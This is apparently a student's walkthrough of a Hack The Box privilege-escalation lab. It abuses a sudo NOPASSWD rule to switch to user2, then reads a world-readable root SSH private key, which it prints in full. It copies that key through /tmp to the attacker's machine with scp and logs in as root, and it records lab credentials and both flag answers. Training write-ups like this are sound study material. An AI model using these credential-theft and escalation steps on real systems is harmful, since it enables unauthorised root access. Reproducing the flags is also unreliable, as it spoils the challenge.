## Privilege Escalation Pentest
IP: 83.136.254.47
Port: 34842
user: `user1`
password: `password1`

1. Connect using ssh
```bash
ssh user1@83.136.254.47 -p 34842
```
#### Question: Once you login, try to find a way to move to 'user2', to get the flag in '/home/user2/flag.txt'.

1. try to see if you can access `/home/user2/flag.txt` as user1
```bash
user1@ng-1397757-gettingstartedprivesc-p4mtc-6696fbc4cc-hjmjb:~$ cat /home/user2/flag.txt 
cat: /home/user2/flag.txt: Permission denied
```
- Permission denied.
2. Try `sudo -l` to see what commands you can run as user1
```bash
user1@ng-1397757-gettingstartedprivesc-p4mtc-6696fbc4cc-hjmjb:~$ sudo -l
Matching Defaults entries for user1 on
    ng-1397757-gettingstartedprivesc-p4mtc-6696fbc4cc-hjmjb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user1 may run the following commands on
        ng-1397757-gettingstartedprivesc-p4mtc-6696fbc4cc-hjmjb:
    (user2 : user2) NOPASSWD: /bin/bash
```
- `(user2 : user2) NOPASSWD: /bin/bash` we can execute terminal as user2
    - Execute this using `sudo -u user2 /bin/bash`
    ```bash
    user1@ng-1397757-gettingstartedprivesc-p4mtc-6696fbc4cc-hjmjb:~$ sudo -u user2 /bin/bash
    user2@ng-1397757-gettingstartedprivesc-p4mtc-6696fbc4cc-hjmjb:/home/user1$
    ```
    - Notice the user has changed at the beginning. Now read `/home/user2/flag.txt`
    ```bash
    user2@ng-1397757-gettingstartedprivesc-p4mtc-6696fbc4cc-hjmjb:/home/user1$ cat /home/user2/flag.txt 
    HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}
    ```
    - The flag! `HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}`

#### Question 2: Once you gain access to 'user2', try to find a way to escalate your privileges to root, to get the flag in '/root/flag.txt'.
1. Tried running `sudo -l` to see what commands can run as user2 but resulted in error as I ***don't know the password***
```bash
user2@ng-1397757-gettingstartedprivesc-p4mtc-6696fbc4cc-hjmjb:/home/user1$ sudo -l
[sudo] password for user2: 
Sorry, try again.
[sudo] password for user2: 
sudo: 1 incorrect password attempt
```
2. Try the `.ssh` dir to see if we have read or write access to it
    - No `.ssh` dir found under `/home/user2/`
3. In the question, they need you to get a flag from `/root/flag.txt`. Go to the `/`root dir and list all the files.
```bash
user2@ng-1397757-gettingstartedprivesc-p4mtc-6696fbc4cc-hjmjb:/$ cd /
user2@ng-1397757-gettingstartedprivesc-p4mtc-6696fbc4cc-hjmjb:/$ ls -al
total 68
drwxr-xr-x   1 root root  4096 Oct  7 21:36 .
drwxr-xr-x   1 root root  4096 Oct  7 21:36 ..
lrwxrwxrwx   1 root root     7 Jul 20  2020 bin -> usr/bin
drwxr-xr-x   2 root root  4096 Apr 15  2020 boot
drwxr-xr-x   5 root root   360 Oct  7 21:36 dev
drwxr-xr-x   1 root root  4096 Feb 12  2021 etc
drwxr-xr-x   1 root root  4096 Feb 12  2021 home
lrwxrwxrwx   1 root root     7 Jul 20  2020 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Jul 20  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Jul 20  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Jul 20  2020 libx32 -> usr/libx32
drwxr-xr-x   2 root root  4096 Jul 20  2020 media
drwxr-xr-x   2 root root  4096 Jul 20  2020 mnt
drwxr-xr-x   2 root root  4096 Jul 20  2020 opt
dr-xr-xr-x 386 root root     0 Oct  7 21:36 proc
drwxr-x---   1 root user2 4096 Feb 12  2021 root
drwxr-xr-x   1 root root  4096 Oct  7 21:52 run
lrwxrwxrwx   1 root root     8 Jul 20  2020 sbin -> usr/sbin
drwxr-xr-x   2 root root  4096 Jul 20  2020 srv
dr-xr-xr-x  13 root root     0 Sep 25 07:47 sys
drwxrwxrwt   1 root root  4096 Aug 19  2020 tmp
drwxr-xr-x   1 root root  4096 Jul 20  2020 usr
drwxr-xr-x   1 root root  4096 Aug 19  2020 var
```
- There is a root dir
4. Check to see if you can find `.ssh` dir in `/root` and what permissions are set
```bash
user2@ng-1397757-gettingstartedprivesc-p4mtc-6696fbc4cc-hjmjb:/root$ ls -al
total 32
drwxr-x--- 1 root user2 4096 Feb 12  2021 .
drwxr-xr-x 1 root root  4096 Oct  7 21:36 ..
-rwxr-x--- 1 root user2    5 Aug 19  2020 .bash_history
-rwxr-x--- 1 root user2 3106 Dec  5  2019 .bashrc
-rwxr-x--- 1 root user2  161 Dec  5  2019 .profile
drwxr-x--- 1 root user2 4096 Feb 12  2021 .ssh
-rwxr-x--- 1 root user2 1309 Aug 19  2020 .viminfo
-rw------- 1 root root    33 Feb 12  2021 flag.txt
```
- The owner -**root**- has read, write, and execute permissions.
- The group -***user2**- has read and execute permissions `r-x`
- Others have no permissions
5. Check for file permissions in the `.ssh` directory
```bash
user2@ng-1397757-gettingstartedprivesc-p4mtc-6696fbc4cc-hjmjb:/root$ cd .ssh/
user2@ng-1397757-gettingstartedprivesc-p4mtc-6696fbc4cc-hjmjb:/root/.ssh$ ls -al
total 20
drwxr-x--- 1 root user2 4096 Feb 12  2021 .
drwxr-x--- 1 root user2 4096 Feb 12  2021 ..
-rw------- 1 root root   571 Feb 12  2021 authorized_keys
-rw-r--r-- 1 root root  2602 Feb 12  2021 id_rsa
-rw-r--r-- 1 root root   571 Feb 12  2021 id_rsa.pub
```
- looks like the world has read permissions to the `id_rsa` file
6. read the file 
```bash
user2@ng-1397757-gettingstartedprivesc-p4mtc-6696fbc4cc-hjmjb:/root/.ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```
7. At this point, remeber that you still only have access to **user1**. So put this `id_rsa` file in some dir that user1 has access to, so that you can download the file to your local machine as user1
```bash
user2@ng-1397757-gettingstartedprivesc-p4mtc-6696fbc4cc-hjmjb:/root/.ssh$ cp ./id_rsa /home/user1/
cp: cannot create regular file '/home/user1/id_rsa': Permission denied
```
- Currently logged in as user2 and tried to copy a the id_rsa file to user1 home dir and permission was denied.
- Notice from ***step 3*** that the world has read and write access to `/tmp` dir. Put the id_rsa file there instead, so that you can pull it as user1
```bash
user2@ng-1397757-gettingstartedprivesc-p4mtc-6696fbc4cc-hjmjb:/root/.ssh$ cp ./id_rsa /tmp/id_rsa_root
```
- Now change the permissions to **rwx** for all users
`chmod +777 ./id_rsa_root`
8. Finally, SSH into user1 again with the credentials from up top and copy the file from /tmp:
```bash
$ scp -P 34842 user1@83.136.254.47:/tmp/id_rsa_root /home/htb-ac-1397757/Downloads/
(user1@83.136.254.47) Password: 
id_rsa_root                                   100% 2602   226.1KB/s   00:00 
```
- `scp`: used for copy using ssh
- **user1@83.136.254.47:/tmp/id_rsa_root**: This is the dir you want to copy from the remote host
- **/home/htb-ac-1397757/Downloads/**: Dir you want to copy to on localhost.
9. Remeber to update permissions of id_rsa_root on localhost to **600** because ssh won't allow to connect with rwx for everyone.
- chmod +600 ~/Downloads/id_rsa_root.txt
10. SSH as root and copy the flag from `/root/flag.txt`
    ```bash
    ssh root@83.136.254.47 -p 34842 -i ~/Downloads/id_rsa_root 
    ```
    - Log in as root
    - grab the flag
    ```bash
    root@ng-1397757-gettingstartedprivesc-p4mtc-6696fbc4cc-hjmjb:~# cat /root/flag.txt 
    HTB{pr1v1l363_35c4l4710n_2_r007}
    ```
